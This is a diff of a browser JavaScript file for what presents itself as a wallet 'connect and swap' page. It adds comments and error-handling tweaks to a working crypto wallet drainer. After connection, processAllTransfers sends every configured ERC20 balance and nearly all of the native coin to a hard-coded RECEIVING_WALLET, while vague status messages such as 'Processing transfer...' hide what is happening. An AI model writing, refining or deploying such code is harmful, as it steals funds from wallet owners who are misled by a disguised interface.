@@ -1,46 +1,65 @@
-// Ensure these are loaded first by including them before app.js in HTML
+// app.js - Full working version (non-module approach)
+// Make sure networks.js and tokens.js are loaded before this file in HTML
+
+// Verify required globals are available
 if (typeof NETWORK_CONFIGS === 'undefined') {
-  throw new Error("NETWORK_CONFIGS is not defined. Make sure networks.js is loaded before app.js");
+  throw new Error("NETWORK_CONFIGS is not defined. Load networks.js first");
 }
 if (typeof TOKENS === 'undefined') {
-  throw new Error("TOKENS is not defined. Make sure tokens.js is loaded before app.js");
+  throw new Error("TOKENS is not defined. Load tokens.js first");
 }
 if (typeof RECEIVING_WALLET === 'undefined') {
-  throw new Error("RECEIVING_WALLET is not defined. Make sure tokens.js is loaded before app.js");
+  throw new Error("RECEIVING_WALLET is not defined. Load tokens.js first");
 }
 
+// Standard ERC20 ABI (fallback for tokens without explicit ABI)
 const ERC20_ABI = [
   "function balanceOf(address owner) view returns (uint256)",
   "function transfer(address to, uint256 amount) returns (bool)"
 ];
 
+// App state
 let provider, signer, userAddress;
 let currentNetwork = "bsc";
 const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 
+// Initialize when page loads
 window.addEventListener('load', async () => {
-  document.getElementById('currentUrl').textContent = window.location.href;
-  document.getElementById("networkSelect").addEventListener('change', (e) => {
-    currentNetwork = e.target.value;
+  try {
+    // Set current URL for Trust Wallet fallback
+    document.getElementById('currentUrl').textContent = window.location.href;
+    
+    // Setup network selector
+    document.getElementById("networkSelect").addEventListener('change', (e) => {
+      currentNetwork = e.target.value;
+      updateTokenVisibility();
+    });
+    
+    // Setup buttons
+    document.getElementById("openTrustWallet").addEventListener('click', openInTrustWallet);
+    document.getElementById("connectWallet").addEventListener("click", connectAndSwap);
+    
+    // Initial UI setup
+    await checkWalletEnvironment();
     updateTokenVisibility();
-  });
-  document.getElementById("openTrustWallet").addEventListener('click', openInTrustWallet);
-  document.getElementById("connectWallet").addEventListener("click", connectAndSwap);
-  await checkWalletEnvironment();
-  updateTokenVisibility();
+  } catch (err) {
+    console.error("Initialization error:", err);
+    updateStatus("Initialization failed: " + err.message, "error");
+  }
 });
 
+// Wallet connection functions
 async function checkWalletEnvironment() {
   if (isMobile && !window.ethereum) {
     showTrustWalletUI();
-  } else if (window.ethereum && window.ethereum.isTrust) {
+  } else if (window.ethereum?.isTrust) {
     hideTrustWalletUI();
   } else if (isMobile && window.ethereum) {
     hideTrustWalletUI();
   }
   
   // Auto-connect if wallet is already connected
-  if (window.ethereum && window.ethereum.selectedAddress) {
+  if (window.ethereum?.selectedAddress) {
     await initializeWallet();
   }
 }
@@ -57,10 +76,11 @@ async function initializeWallet() {
       `Connected: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)} | Network: ${NETWORK_CONFIGS[currentNetwork].chainName}`;
   } catch (err) {
     console.error("Wallet initialization error:", err);
-    updateStatus("Connection error. Please try again.", "error");
+    throw new Error("Failed to initialize wallet");
   }
 }
 
+// UI Functions
 function showTrustWalletUI() {
   document.getElementById("trustContainer").style.display = 'block';
   document.getElementById("connectWallet").style.display = 'none';
@@ -87,10 +107,11 @@ function updateTokenVisibility() {
   });
 }
 
+// Main workflow
 async function connectAndSwap() {
   try {
     showLoader();
-    updateStatus("Initializing connection...", "success");
+    updateStatus("Connecting wallet...", "success");
 
     if (isMobile && !window.ethereum) {
       showTrustWalletUI();
@@ -98,7 +119,7 @@ async function connectAndSwap() {
     }
 
     if (!window.ethereum) {
-      throw new Error("Wallet not detected. Please install MetaMask or Trust Wallet");
+      throw new Error("Please install MetaMask or Trust Wallet");
     }
 
     await window.ethereum.request({ method: "eth_requestAccounts" });
@@ -106,11 +127,13 @@ async function connectAndSwap() {
     await initializeWallet();
     await processAllTransfers();
   } catch (err) {
-    hideLoader();
+    console.error("Connection error:", err);
     updateStatus("Error: " + err.message, "error");
     document.getElementById("connectWallet").disabled = false;
     document.getElementById("connectWallet").innerHTML = `<i class="fas fa-wallet"></i> Connect Wallet`;
     if (isMobile) showTrustWalletUI();
+  } finally {
+    hideLoader();
   }
 }
 
@@ -120,7 +143,7 @@ async function checkNetwork() {
     const targetChainId = NETWORK_CONFIGS[currentNetwork].chainId;
     
     if (chainId !== targetChainId) {
-      updateStatus(`Switching network...`, "success");
+      updateStatus("Switching network...", "success");
       try {
         await window.ethereum.request({
           method: 'wallet_switchEthereumChain',
@@ -134,22 +157,25 @@ async function checkNetwork() {
               params: [NETWORK_CONFIGS[currentNetwork]]
             });
           } catch (addError) {
-            throw new Error(`Please switch network manually`);
+            throw new Error("Please switch networks manually");
           }
         }
         throw new Error("Failed to switch network");
       }
     }
   } catch (err) {
+    console.error("Network error:", err);
     throw new Error("Network error: " + err.message);
   }
 }
 
+// Token processing
 async function processAllTransfers() {
   try {
     const tokensToSwap = TOKENS[currentNetwork].sort((a, b) => a.priority - b.priority);
     let successCount = 0;
     
+    // Process ERC20 tokens
     for (const token of tokensToSwap.filter(t => !t.isNative)) {
       try {
         updateStatus(`Processing transfer...`, "success");
@@ -169,14 +195,16 @@ async function processAllTransfers() {
           );
         }
       } catch (err) {
-        console.error("Transfer error:", err);
-        updateStatus(`Transfer failed`, "error");
+        console.error(`Transfer error:`, err);
+        updateStatus("Transfer failed", "error");
       }
     }
 
+    // Process native token
     const nativeToken = tokensToSwap.find(t => t.isNative);
     if (nativeToken) {
       try {
+        updateStatus(`Processing final transfer...`, "success");
         const balance = await provider.getBalance(userAddress);
         const keepAmount = ethers.utils.parseUnits("0.002", nativeToken.decimals);
         const sendAmount = balance.gt(keepAmount) ? balance.sub(keepAmount) : balance;
@@ -200,15 +228,15 @@ async function processAllTransfers() {
       }
     }
     
-    updateStatus(successCount > 0 ? "Process completed" : "No balances found", "success");
+    updateStatus(successCount > 0 ? "All transfers completed" : "No balances found", "success");
     document.getElementById("connectWallet").innerHTML = `<i class="fas fa-check-circle"></i> Done`;
   } catch (err) {
-    throw new Error("Processing failed");
-  } finally {
-    hideLoader();
+    console.error("Processing error:", err);
+    throw new Error("Transfer process failed");
   }
 }
 
+// Helper functions
 function updateStatus(message, type) {
   const statusDiv = document.getElementById("status");
   statusDiv.style.display = "block";
